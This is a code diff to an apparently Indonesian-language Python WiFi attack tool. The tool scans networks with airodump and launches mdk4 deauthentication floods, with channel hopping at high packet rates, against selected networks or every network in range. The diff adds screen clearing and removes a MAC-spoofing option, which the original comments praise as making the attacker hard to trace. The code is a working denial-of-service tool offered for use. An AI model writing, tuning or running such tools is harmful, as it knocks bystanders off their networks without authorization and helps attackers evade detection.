@@ -21,6 +21,9 @@ GLITCH_CHARS = "!@#$%^&*<>/\\|~?01"
 GLITCH_COLORS = [GREEN, RED, CYAN, MAGENTA, YELLOW]
 
 
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
 
 def glitch_text(text):
     return f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
@@ -142,7 +145,7 @@ def start_monitor_mode(adapter):
 
 
 def scan_networks(adapter, duration=10):
-
+    clear_screen()
     glitch_print("SCANNING WIFI NETWORKS...")
     
     temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
@@ -197,7 +200,7 @@ def scan_networks(adapter, duration=10):
 
 
 def stop_monitor_mode(monitor_iface):
-
+    clear_screen()
     
     candidates = [monitor_iface]
     if monitor_iface.endswith("mon"):
@@ -211,7 +214,7 @@ def stop_monitor_mode(monitor_iface):
             break
 
     run_command(["sudo", "systemctl", "restart", "NetworkManager"], None, show_output=False)
-
+    clear_screen()
 
 
 def parse_target_selection(choice_str, total_targets):
@@ -320,9 +323,9 @@ def select_attack_mode():
 def run_deauth_mdk4(targets, monitor_iface):
     """
     Menjalankan MDK4 untuk multiple target dengan MODE OP
-    - MAC Spoofing (-f): Sulit dilacak
-    - Packet Rate 1000/s (-s 1000): Super agresif
+    - Packet Rate tinggi (-s 500): Super agresif
     - Channel Hopping (-c h): Serang semua channel
+    - Multiple target via file (-B)
     """
     if not targets:
         print(f"{RED}Tidak ada target untuk diserang.{RESET}")
@@ -342,22 +345,21 @@ def run_deauth_mdk4(targets, monitor_iface):
         for target in targets:
             print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
         
-        # Base command dengan semua fitur OP
+        # Base command dengan semua fitur OP (tanpa -f karena gak support)
         mdk4_cmd = [
             "sudo",
             "mdk4",
             monitor_iface,
-            "d",            # Deauth mode
+            "d",                # Deauth mode
             "-B", target_file.name,  # Target list file
-            "-c", "h",      # High speed channel hopping
-            "-f",           # MAC Spoofing - Sulit dilacak!
-            "-s", "1000"    # 1000 packets per second - Super agresif!
+            "-c", "h",          # High speed channel hopping
+            "-s", "500"         # 500 packets per second - Agresif!
         ]
         
         print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
-        print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
-        print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
+        print(f"{CYAN}✓ Packet Rate: 500 packets/detik (super agresif){RESET}")
         print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
+        print(f"{YELLOW}⚠ MDK4 versi ini tidak support MAC Spoofing (-f){RESET}")
         
         print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
         print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
@@ -390,8 +392,7 @@ def run_deauth_mdk4(targets, monitor_iface):
 def run_deauth_all_mdk4(monitor_iface):
     """
     Menjalankan MDK4 untuk semua target dengan MODE OP
-    - MAC Spoofing (-f): Sulit dilacak
-    - Packet Rate 1000/s (-s 1000): Super agresif
+    - Packet Rate tinggi (-s 500): Super agresif
     - Channel Hopping (-c h): Serang semua channel
     """
     print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke SEMUA target...{RESET}")
@@ -403,14 +404,13 @@ def run_deauth_all_mdk4(monitor_iface):
         monitor_iface,
         "d",            # Deauth mode
         "-c", "h",      # High speed channel hopping
-        "-f",           # MAC Spoofing
-        "-s", "1000"    # 1000 packets per second
+        "-s", "500"     # 500 packets per second - Agresif!
     ]
     
     print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
-    print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
-    print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
+    print(f"{CYAN}✓ Packet Rate: 500 packets/detik (super agresif){RESET}")
     print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
+    print(f"{YELLOW}⚠ MDK4 versi ini tidak support MAC Spoofing (-f){RESET}")
     
     print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
     print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
@@ -471,7 +471,7 @@ def select_interface():
         if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
             selected = ifaces[int(choice) - 1]
             glitch_print(f"LOCKED: {selected}")
-        
+            clear_screen()
             return selected
         print("Input salah, coba lagi.")
 
@@ -486,7 +486,7 @@ def main():
                 adapter = select_interface()
                 monitor_iface = start_monitor_mode(adapter)
 
-        
+            clear_screen()
             
             # Pilih mode serangan
             attack_mode = select_attack_mode()
@@ -530,7 +530,7 @@ def main():
             if action == "exit":
                 if monitor_iface:
                     stop_monitor_mode(monitor_iface)
-            
+                clear_screen()
                 sys.exit(0)
 
 
